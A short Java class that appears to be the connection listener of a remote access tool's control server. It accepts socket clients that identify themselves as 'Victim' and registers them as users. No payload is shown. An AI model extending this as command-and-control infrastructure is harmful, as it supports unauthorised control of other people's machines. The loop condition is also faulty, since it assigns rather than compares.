package Server.networking;

import Server.core.Main;
import Server.networking.entities.User;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

public class Server {

    ServerSocket socket;
    public List<User> UserList = new ArrayList<User>();
    public static boolean Listening = false;
    public static int port;
    private int UserID = 1;

    public void Start(int port) {
        this.port = port;
        Server.Listening listening = new Listening();
        Thread thr = new Thread(listening);
        thr.start();
    }

    private class Listening implements Runnable {

        public void run() {
            try {
                socket = new ServerSocket(port);
                Listening = true;
                while (Listening = true) {
                    Socket Connection = socket.accept();
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Connection.getInputStream()));
                    String Hello = bufferedReader.readLine();
                    if (Hello.equalsIgnoreCase("Victim")) {
                        User u = new User();
                        u.UserID = UserID;
                        u.Start(Connection);
                        Main.init.UserJoined(u);
                    }
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}